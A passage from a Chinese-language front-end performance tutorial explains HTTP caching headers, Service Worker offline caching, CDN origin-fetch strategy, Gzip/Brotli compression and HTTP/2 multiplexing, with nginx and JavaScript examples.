W/"d53jk-"）    alt 资源未修改        Server->>Browser: 304 Not Modified（空body）        Browser->>Browser: 使用缓存    else 资源已更新        Server->>Browser: 200 OK + 新资源    end</pre><p><strong>对比与选型指南</strong></p><table><thead><tr><th align="left">特性</th><th align="left">强缓存</th><th align="left">协商缓存</th></tr></thead><tbody><tr><td align="left">网络请求</td><td align="left">无请求</td><td align="left">有请求（304响应）</td></tr><tr><td align="left">带宽消耗</td><td align="left">0</td><td align="left">小（仅头部传输）</td></tr><tr><td align="left">更新灵敏度</td><td align="left">依赖max-age设置</td><td align="left">即时更新</td></tr><tr><td align="left">适用资源</td><td align="left">静态资源（JS&#x2F;CSS&#x2F;图片版本化）</td><td align="left">动态内容（个性化API数据）</td></tr><tr><td align="left">典型配置</td><td align="left">Cache-Control: max-age&#x3D;31536000, immutable</td><td align="left">Cache-Control: no-cache + ETag</td></tr></tbody></table><p><strong>最佳实践配置</strong></p><p>(1) 静态资源（强缓存）</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">location</span> /static/ &#123;<br>  <span class="hljs-attribute">add_header</span> Cache-Control <span class="hljs-string">&quot;public, max-age=31536000, immutable&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>(2) 动态 API（协商缓存）</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">location</span> /api/ &#123;<br>  <span class="hljs-attribute">add_header</span> Cache-Control <span class="hljs-string">&quot;no-cache&quot;</span>;<br>  <span class="hljs-attribute">etag</span> <span class="hljs-literal">on</span>;  <span class="hljs-comment"># 启用ETag</span><br>&#125;<br></code></pre></td></tr></table></figure><p>(3) 混合策略</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs HTTP"><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=600, must-revalidate<br></code></pre></td></tr></table></figure><blockquote><p>600秒内强缓存 → 过期后必须验证（转为协商缓存）</p></blockquote><p><strong>浏览器行为验证</strong></p><ul><li>强缓存生效：Chrome DevTools → Network → Size列显示 (memory cache)</li><li>协商缓存生效：<ul><li>响应状态码 304</li><li>Headers中的 ETag&#x2F;Last-Modified 与请求头匹配</li></ul></li></ul><p><strong>缓存层级决策策略</strong></p><pre class="mermaid">graph TD  A[资源类型] --> B{是否版本化？}  B -->|是| C[强缓存：max-age=1年+immutable]  B -->|否| D{更新频率？}  D -->|高频更新| E[协商缓存：no-cache+ETag]  D -->|低频更新| F[强缓存：max-age=1小时]</pre><h3 id="Service-Worker离线缓存"><a href="#Service-Worker离线缓存" class="headerlink" title="Service Worker离线缓存"></a>Service Worker离线缓存</h3><p><strong>核心原理</strong></p><p>Service Worker 是浏览器独立于网页运行的脚本，作为网络请求的可编程代理，通过拦截请求实现离线缓存控制。</p><pre class="mermaid">graph LR  A[网页请求] --> B{Service Worker}  B -->|命中缓存| C[返回缓存]  B -->|未命中| D[转发请求 → 网络]  D --> E[缓存新资源]</pre><p><strong>关键实现步骤</strong></p><p>(1) 注册与安装</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 主线程注册</span><br><span class="hljs-keyword">if</span> (<span class="hljs-string">&#x27;serviceWorker&#x27;</span> <span class="hljs-keyword">in</span> navigator) &#123;<br>  navigator.<span class="hljs-property">serviceWorker</span>.<span class="hljs-title function_">register</span>(<span class="hljs-string">&#x27;/sw.js&#x27;</span>, &#123; <span class="hljs-attr">scope</span>: <span class="hljs-string">&#x27;/&#x27;</span> &#125;)<br>    .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">reg</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;SW注册成功&#x27;</span>))<br>    .<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">err</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&#x27;SW注册失败&#x27;</span>, err));<br>&#125;<br></code></pre></td></tr></table></figure><p>sw.js - 安装阶段：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">CACHE_NAME</span> = <span class="hljs-string">&#x27;v1-static&#x27;</span>;<br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">PRE_CACHE_URLS</span> = [  <span class="hljs-comment">// 预缓存列表</span><br>  <span class="hljs-string">&#x27;/&#x27;</span>,<br>  <span class="hljs-string">&#x27;/index.html&#x27;</span>,<br>  <span class="hljs-string">&#x27;/styles.css&#x27;</span>,<br>  <span class="hljs-string">&#x27;/app.js&#x27;</span><br>];<br><br>self.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;install&#x27;</span>, <span class="hljs-function"><span class="hljs-params">event</span> =&gt;</span> &#123;<br>  event.<span class="hljs-title function_">waitUntil</span>(<br>    caches.<span class="hljs-title function_">open</span>(<span class="hljs-variable constant_">CACHE_NAME</span>)<br>      .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">cache</span> =&gt;</span> cache.<span class="hljs-title function_">addAll</span>(<span class="hljs-variable constant_">PRE_CACHE_URLS</span>))  <span class="hljs-comment">// 预缓存核心资源</span><br>      .<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> self.<span class="hljs-title function_">skipWaiting</span>())  <span class="hljs-comment">// 强制激活新SW</span><br>  );<br>&#125;);<br></code></pre></td></tr></table></figure><p>(2) 缓存策略实施 - 拦截请求并响应：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">self.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;fetch&#x27;</span>, <span class="hljs-function"><span class="hljs-params">event</span> =&gt;</span> &#123;<br>  event.<span class="hljs-title function_">respondWith</span>(<br>    <span class="hljs-comment">// 策略1：缓存优先（离线优先）</span><br>    caches.<span class="hljs-title function_">match</span>(event.<span class="hljs-property">request</span>)<br>      .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">cached</span> =&gt;</span> cached || <span class="hljs-title function_">fetchAndCache</span>(event.<span class="hljs-property">request</span>))<br>    <br>    <span class="hljs-comment">// 策略2：网络优先（实时数据）</span><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    fetch(event.request)</span><br><span class="hljs-comment">      .catch(() =&gt; caches.match(event.request))</span><br><span class="hljs-comment">    */</span><br>  );<br>&#125;);<br><br><span class="hljs-comment">// 网络请求并缓存</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">fetchAndCache</span>(<span class="hljs-params">request</span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-title function_">fetch</span>(request).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">networkRes</span> =&gt;</span> &#123;<br>    <span class="hljs-comment">// 克隆响应（流只能读取一次）</span><br>    <span class="hljs-keyword">const</span> resClone = networkRes.<span class="hljs-title function_">clone</span>();<br>    caches.<span class="hljs-title function_">open</span>(<span class="hljs-variable constant_">CACHE_NAME</span>).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">cache</span> =&gt;</span> cache.<span class="hljs-title function_">put</span>(request, resClone));<br>    <span class="hljs-keyword">return</span> networkRes;<br>  &#125;);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>缓存更新机制</strong></p><p>(1) 版本化缓存命名</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 更新SW时修改版本号</span><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">CACHE_NAME</span> = <span class="hljs-string">&#x27;v2-static&#x27;</span>;  <span class="hljs-comment">// 新版本</span><br></code></pre></td></tr></table></figure><p>(2) 激活阶段清理旧缓存</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">self.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;activate&#x27;</span>, <span class="hljs-function"><span class="hljs-params">event</span> =&gt;</span> &#123;<br>  event.<span class="hljs-title function_">waitUntil</span>(<br>    caches.<span class="hljs-title function_">keys</span>().<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">cacheNames</span> =&gt;</span> <br>      <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">all</span>(<br>        cacheNames.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">name</span> =&gt;</span> &#123;<br>          <span class="hljs-keyword">if</span> (name !== <span class="hljs-variable constant_">CACHE_NAME</span>) <span class="hljs-keyword">return</span> caches.<span class="hljs-title function_">delete</span>(name); <span class="hljs-comment">// 删除旧缓存</span><br>        &#125;)<br>      ).<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> self.<span class="hljs-property">clients</span>.<span class="hljs-title function_">claim</span>())  <span class="hljs-comment">// 立即控制所有页面</span><br>  );<br>&#125;);<br></code></pre></td></tr></table></figure><p><strong>性能优化技巧</strong></p><p>(1) 缓存分段策略</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">CORE_CACHE</span> = <span class="hljs-string">&#x27;core-v1&#x27;</span>;   <span class="hljs-comment">// 核心页面</span><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">IMG_CACHE</span> = <span class="hljs-string">&#x27;images-v1&#x27;</span>;  <span class="hljs-comment">// 图片资源</span><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">API_CACHE</span> = <span class="hljs-string">&#x27;api-v1&#x27;</span>;     <span class="hljs-comment">// API数据</span><br></code></pre></td></tr></table></figure><p>(2) 动态缓存限制</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 缓存最多50个API响应</span><br>caches.<span class="hljs-title function_">open</span>(<span class="hljs-variable constant_">API_CACHE</span>).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">cache</span> =&gt;</span> &#123;<br>  cache.<span class="hljs-title function_">keys</span>().<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">keys</span> =&gt;</span> &#123;<br>    <span class="hljs-keyword">if</span> (keys.<span class="hljs-property">length</span> &gt; <span class="hljs-number">50</span>) cache.<span class="hljs-title function_">delete</span>(keys[<span class="hljs-number">0</span>]);<br>  &#125;);<br>&#125;);<br></code></pre></td></tr></table></figure><p>(3) Stale-While-Revalidate</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">event.<span class="hljs-title function_">respondWith</span>(<br>  caches.<span class="hljs-title function_">match</span>(request).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">cached</span> =&gt;</span> &#123;<br>    <span class="hljs-keyword">const</span> fetchPromise = <span class="hljs-title function_">fetchAndCache</span>(request);<br>    <span class="hljs-keyword">return</span> cached || fetchPromise;  <span class="hljs-comment">// 优先返回缓存，后台更新</span><br>  &#125;)<br>);<br></code></pre></td></tr></table></figure><p><strong>完整示例架构</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs Text">/public<br>  ├── index.html<br>  ├── styles.css<br>  ├── app.js<br>  └── sw.js   # Service Worker主文件<br></code></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// sw.js</span><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">CORE_CACHE</span> = <span class="hljs-string">&#x27;core-v1&#x27;</span>;<br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">CORE_URLS</span> = [ <span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-string">&#x27;/offline.html&#x27;</span> ];<br><br><span class="hljs-comment">// 安装阶段</span><br>self.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;install&#x27;</span>, <span class="hljs-function"><span class="hljs-params">event</span> =&gt;</span> &#123;<br>  event.<span class="hljs-title function_">waitUntil</span>(<br>    caches.<span class="hljs-title function_">open</span>(<span class="hljs-variable constant_">CORE_CACHE</span>)<br>      .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">cache</span> =&gt;</span> cache.<span class="hljs-title function_">addAll</span>(<span class="hljs-variable constant_">CORE_URLS</span>))<br>      .<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> self.<span class="hljs-title function_">skipWaiting</span>())<br>  );<br>&#125;);<br><br><span class="hljs-comment">// 激活清理</span><br>self.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;activate&#x27;</span>, <span class="hljs-function"><span class="hljs-params">event</span> =&gt;</span> &#123;<br>  event.<span class="hljs-title function_">waitUntil</span>(<br>    caches.<span class="hljs-title function_">keys</span>().<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">keys</span> =&gt;</span> <br>      <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">all</span>(keys.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">key</span> =&gt;</span> <br>        key !== <span class="hljs-variable constant_">CORE_CACHE</span> ? caches.<span class="hljs-title function_">delete</span>(key) : <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>()<br>      ))<br>    ).<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> self.<span class="hljs-property">clients</span>.<span class="hljs-title function_">claim</span>())<br>  );<br>&#125;);<br><br><span class="hljs-comment">// 拦截请求</span><br>self.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;fetch&#x27;</span>, <span class="hljs-function"><span class="hljs-params">event</span> =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> &#123; request &#125; = event;<br>  <br>  <span class="hljs-comment">// 导航请求回退到离线页面</span><br>  <span class="hljs-keyword">if</span> (request.<span class="hljs-property">mode</span> === <span class="hljs-string">&#x27;navigate&#x27;</span>) &#123;<br>    event.<span class="hljs-title function_">respondWith</span>(<br>      <span class="hljs-title function_">fetch</span>(request).<span class="hljs-title function_">catch</span>(<span class="hljs-function">() =&gt;</span> caches.<span class="hljs-title function_">match</span>(<span class="hljs-string">&#x27;/offline.html&#x27;</span>))<br>    );<br>    <span class="hljs-keyword">return</span>;<br>  &#125;<br><br>  <span class="hljs-comment">// 静态资源缓存优先</span><br>  event.<span class="hljs-title function_">respondWith</span>(<br>    caches.<span class="hljs-title function_">match</span>(request).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">cached</span> =&gt;</span> <br>      cached || <span class="hljs-title function_">fetch</span>(request).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> &#123;<br>        <span class="hljs-comment">// 仅缓存安全资源</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_">isCacheable</span>(request, res)) &#123;<br>          <span class="hljs-keyword">const</span> clone = res.<span class="hljs-title function_">clone</span>();<br>          caches.<span class="hljs-title function_">open</span>(<span class="hljs-title function_">dynamicCacheName</span>(request)).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">cache</span> =&gt;</span> <br>            cache.<span class="hljs-title function_">put</span>(request, clone)<br>          );<br>        &#125;<br>        <span class="hljs-keyword">return</span> res;<br>      &#125;)<br>    )<br>  );<br>&#125;);<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">isCacheable</span>(<span class="hljs-params">req, res</span>) &#123;<br>  <span class="hljs-keyword">return</span> req.<span class="hljs-property">method</span> === <span class="hljs-string">&#x27;GET&#x27;</span> &amp;&amp; <br>         res.<span class="hljs-property">status</span> === <span class="hljs-number">200</span> &amp;&amp; <br>         !req.<span class="hljs-property">url</span>.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&#x27;/api/private&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="4-2-资源加载优化"><a href="#4-2-资源加载优化" class="headerlink" title="4.2 资源加载优化"></a>4.2 资源加载优化</h2><h3 id="CDN原理与缓存配置（边缘节点-回源策略）"><a href="#CDN原理与缓存配置（边缘节点-回源策略）" class="headerlink" title="CDN原理与缓存配置（边缘节点&#x2F;回源策略）"></a>CDN原理与缓存配置（边缘节点&#x2F;回源策略）</h3><p><strong>CDN 核心原理</strong></p><p>定义：内容分发网络（Content Delivery Network），通过全球分布的边缘节点缓存静态资源，使用户就近访问，降低延迟与源站压力。</p><pre class="mermaid">graph LR  A[用户] --> B{就近边缘节点}  B -->|资源命中| C[快速返回缓存]  B -->|资源未命中| D[回源站拉取资源]  D --> E[缓存至边缘节点]  E --> A</pre><p>三大核心组件：</p><ul><li>边缘节点（Edge Node）</li><li>回源策略（Origin Fetch）</li><li>调度系统（DNS负载均衡）</li></ul><p><strong>边缘节点（Edge Node）</strong></p><ul><li>位置：全球数百个POP点（Point of Presence）</li><li>功能：<ul><li>直接响应终端用户请求</li><li>缓存静态资源（HTML&#x2F;CSS&#x2F;JS&#x2F;图片&#x2F;视频）</li><li>执行安全防护（DDoS缓解&#x2F;WAF）</li></ul></li></ul><p><strong>回源策略（Origin Fetch）</strong></p><ul><li>触发条件：边缘节点无缓存或缓存过期</li><li>回源流程：</li></ul><pre class="mermaid">sequenceDiagram    participant User as 用户    participant EdgeNode as CDN边缘节点    participant Origin as 源站服务器    User->>EdgeNode: 1. 请求资源 /image.jpg    Note right of EdgeNode: 检查本地缓存    alt 缓存命中且有效        EdgeNode-->>User: 2. 直接返回缓存资源    else 缓存未命中或过期        EdgeNode->>Origin: 3. 回源请求 (携带缓存验证头)        Origin-->>EdgeNode: 4. 返回资源 + 缓存头        EdgeNode->>EdgeNode: 5. 缓存资源 (按策略)        EdgeNode-->>User: 6. 返回资源    end</pre><p><strong>调度系统（DNS负载均衡）</strong></p><ul><li>GSLB（全局负载均衡）：根据用户IP分配最近节点</li><li>调度算法：<ul><li>地理位置优先</li><li>节点健康检查</li><li>实时流量分析</li></ul></li></ul><p><strong>缓存配置策略</strong></p><p>(1) 规则设置</p><table><thead><tr><th align="left">配置方式</th><th align="left">指令示例</th><th align="left">作用</th></tr></thead><tbody><tr><td align="left">强制缓存</td><td align="left">Cache-Control: public, max-age&#x3D;86400</td><td align="left">资源在CDN缓存1天</td></tr><tr><td align="left">忽略缓存</td><td align="left">Cache-Control: no-store</td><td align="left">CDN不缓存（每次回源）</td></tr><tr><td align="left">条件缓存</td><td align="left">Cache-Control: no-cache</td><td align="left">CDN每次回源验证（类似协商缓存）</td></tr></tbody></table><p>(2) 典型资源配置</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-comment"># Nginx配置示例（源站）</span><br><span class="hljs-section">location</span> <span class="hljs-regexp">~* \.(js|css|png)$</span> &#123;<br>  <span class="hljs-attribute">add_header</span> Cache-Control <span class="hljs-string">&quot;public, max-age=31536000, immutable&quot;</span>;  <span class="hljs-comment"># 静态资源长缓存</span><br>&#125;<br><br><span class="hljs-section">location</span> /api/ &#123;<br>  <span class="hljs-attribute">add_header</span> Cache-Control <span class="hljs-string">&quot;no-cache&quot;</span>;  <span class="hljs-comment"># API不缓存</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>边缘节点缓存行为</strong></p><table><thead><tr><th align="left">请求状态</th><th align="left">处理方式</th><th align="left">响应时间对比源站</th></tr></thead><tbody><tr><td align="left">缓存命中</td><td align="left">直接返回资源</td><td align="left">快 5-10倍（&lt;50ms）</td></tr><tr><td align="left">缓存未命中</td><td align="left">回源拉取 → 缓存 → 返回</td><td align="left">与源站相同</td></tr><tr><td align="left">缓存过期</td><td align="left">回源验证（If-Modified-Since）</td><td align="left">节省带宽（304响应）</td></tr></tbody></table><h3 id="资源压缩（Gzip-Brotli）与HTTP-2多路复用"><a href="#资源压缩（Gzip-Brotli）与HTTP-2多路复用" class="headerlink" title="资源压缩（Gzip&#x2F;Brotli）与HTTP&#x2F;2多路复用"></a>资源压缩（Gzip&#x2F;Brotli）与HTTP&#x2F;2多路复用</h3><p><strong>资源压缩（Gzip vs Brotli）</strong></p><p>核心目标：减小资源体积 → 降低传输时间</p><table><thead><tr><th align="left">特性</th><th align="left">Gzip</th><th align="left">Brotli</th><th align="left">优势对比</th></tr></thead><tbody><tr><td align="left">压缩率</td><td align="left">减少70%大小</td><td align="left">减少85%大小</td><td align="left">Brotli高20%+</td></tr><tr><td align="left">算法原理</td><td align="left">DEFLATE算法（LZ77+哈夫曼）</td><td align="left">LZ77改进+上下文建模</td><td align="left">更高效字典压缩</td></tr><tr><td align="left">压缩速度</td><td align="left">快（低CPU消耗）</td><td align="left">慢（压缩时CPU高3倍）</td><td align="left">Gzip更适合动态压缩</td></tr><tr><td align="left">解压速度</td><td align="left">极快</td><td align="left">极快</td><td align="left">持平</td></tr><tr><td align="left">浏览器支持</td><td align="left">全平台（IE6+）</td><td align="left">Chrome&gt;50, Firefox&gt;44, Safari&gt;15</td><td align="left">Gzip兼容性更广</td></tr><tr><td align="left">最佳适用</td><td align="left">动态内容（API响应）</td><td align="left">静态资源（JS&#x2F;CSS&#x2F;字体）</td><td align="left"></td></tr></tbody></table><p>配置示例：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-comment"># 启用双压缩策略</span><br><span class="hljs-attribute">gzip</span> <span class="hljs-literal">on</span>;<br><span class="hljs-attribute">gzip_types</span> text/plain text/css application/json application/javascript;<br><span class="hljs-attribute">gzip_min_length</span> <span class="hljs-number">1024</span>;  <span class="hljs-comment"># 大于1KB才压缩</span><br><br><span class="hljs-attribute">brotli</span> <span class="hljs-literal">on</span>;<br><span class="hljs-attribute">brotli_types</span> application/xml image/svg+xml;<br><span class="hljs-attribute">brotli_static</span> <span class="hljs-literal">on</span>;      <span class="hljs-comment"># 优先使用预压缩文件</span><br></code></pre></td></tr></table></figure><p>前端收益：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs Text">原始文件： 200KB<br>Gzip后：  60KB（节省140KB）<br>Brotli后：30KB（节省170KB） → 3G网络下加载时间减少40%<br></code></pre></td></tr></table></figure><p><strong>HTTP&#x2F;2多路复用（Multiplexing）</strong></p><p>核心问题：HTTP&#x2F;1.1的队头阻塞（6个TCP连接限制）</p><pre class="mermaid">graph LR  A[HTTP/1.1] --> B[请求1] --> C[响应1] --> D[请求2] --> E[响应2]  F[HTTP/2] --> G[请求1/2/3] --> H[响应1/2/3 并行]</pre><p>实现原理：</p><ul><li>二进制分帧层：<ul><li>将请求&#x2F;响应分解为二进制帧（HEADERS&#x2F;DATA）</li><li>每个帧携带流ID（Stream Identifier）</li></ul></li><li>流优先级：</li></ul><pre class="mermaid">graph TB  S1[流ID11 CSS] -->|优先级高| 浏览器  S2[流ID13 JS] -->|优先级中| 浏览器  S3[流ID15 图片] -->|优先级低| 浏览器</pre><p>性能对比：</p><table><thead><tr><th align="left">场景</th><th align="left">HTTP&#x2F;1.1</th><th align="left">HTTP&#x2F;2</th><th align="left">提升</th></tr></thead><tbody><tr><td align="left">100个小文件（1KB）</td><td align="left">1.5s（6连接排队）</td><td align="left">0.3s（单连接并行）</td><td align="left">80%</td></tr><tr><td align="left">首屏渲染时间</td><td align="left">2.8s</td><td align="left">1.5s</td><td align="left">46%</td></tr><tr><td align="left">TCP连接数</td><td align="left">6-8个</td><td align="left">1个</td><td align="left">资源节省</td></tr></tbody></table><p><strong>HTTP&#x2F;2核心特性协同优化</strong></p><table><thead><tr><th align="left">特性</th><th align="left">配合压缩与多路复用的作用</th></tr></thead><tbody><tr><td align="left">头部压缩（HPACK）</td><td align="left">减少请求头体积（Cookie&#x2F;User-Agent等）</td></tr><tr><td align="left">服务器推送</td><td align="left">主动推送关键资源（无需等待HTML解析）</td></tr><tr><td align="left">流优先级</td><td align="left">优先传输CSS&#x2F;JS（保障渲染速度）</td></tr></tbody></table><p>完整工作流：</p><pre class="mermaid">sequenceDiagram    participant Client    participant Server    Client->>Server: 发起HTTPS连接（TLS握手）    Server->>Client: 返回HTTP/2协议支持    Client->>Server: 发送HEADERS帧（含HPACK压缩头）    Server->>Client: 推送关键CSS（PUSH_PROMISE帧）    Server->>Client: 并行传输HTML+CSS+JS（多DATA帧）    Client->>Browser: 流优先级排序 → 快速渲染</pre><p><strong>实战优化策略</strong></p><p>(1) 压缩策略组合</p><ul><li>静态资源：预压缩Brotli（.br后缀） + 备用Gzip</li><li>动态内容：实时Gzip压缩（CPU消耗低）</li></ul><p>(2) HTTP&#x2F;2 最佳实践</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-comment"># 强制启用HTTP/2</span><br><span class="hljs-attribute">listen</span> <span class="hljs-number">443</span> ssl http2; <br><br><span class="hljs-comment"># 启用服务器推送（需谨慎）</span><br><span class="hljs-attribute">http2_push</span> /style.css; <br><span class="hljs-attribute">http2_push</span> /app.js;<br></code></pre></td></tr></table></figure><p>(3) 资源加载优化</p><ul><li>减少域名分片（HTTP&#x2F;2下单域名更高效）</li><li>图片懒加载 + 异步加载非关键JS</li></ul><h3 id="预加载（preload）与预连接（preconnect）"><a href="#预加载（preload）与预连接（preconnect）" class="headerlink" title="预加载（preload）与预连接（preconnect）"></a>预加载（preload）与预连接（preconnect）</h3><p><strong>预加载（preload）</strong></p><p>核心作用：强制提前加载关键渲染资源，突破浏览器默认优先级限制，加速关键路径渲染。</p><pre class="mermaid">graph LR  A[HTML解析] --> B{发现 preload 标签}  B -->|立即请求| 